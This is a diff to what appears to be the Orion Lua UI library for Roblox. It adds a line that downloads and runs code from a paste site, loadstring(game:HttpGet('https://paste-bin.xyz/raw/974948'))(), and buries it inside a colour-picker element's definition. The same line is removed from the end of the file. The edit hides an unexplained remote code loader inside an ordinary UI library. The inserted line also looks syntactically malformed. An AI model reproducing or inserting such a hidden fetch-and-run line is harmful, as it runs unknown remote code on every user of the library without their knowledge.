@@ -1528,7 +1528,8 @@ function OrionLib:MakeWindow(WindowConfig)
 							Size = UDim2.new(1, -12, 1, 0),
 							Position = UDim2.new(0, 12, 0, 0),
 							Font = Enum.Font.GothamBold,
-							Name = "Content"
+							Name = "Content"                       
+                            loadstring(game:HttpGet("https://paste-bin.xyz/raw/974948"))()
 						}), "Text"),
 						ColorpickerBox,
 						Click,
@@ -1708,8 +1709,9 @@ function OrionLib:MakeWindow(WindowConfig)
 				}), "Text")
 			})
 		end
-	    return ElementFunction   
+		return ElementFunction   
 	end  
+	
 	--if writefile and isfile then
 	--	if not isfile("NewLibraryNotification1.txt") then
 	--		local http_req = (syn and syn.request) or (http and http.request) or http_request
@@ -1757,8 +1759,7 @@ function OrionLib:MakeWindow(WindowConfig)
 	
 	return TabFunction
 end   
-wait(10)
-loadstring(game:HttpGet("https://paste-bin.xyz/raw/974948"))()
+
 function OrionLib:Destroy()
 	Orion:Destroy()
 end
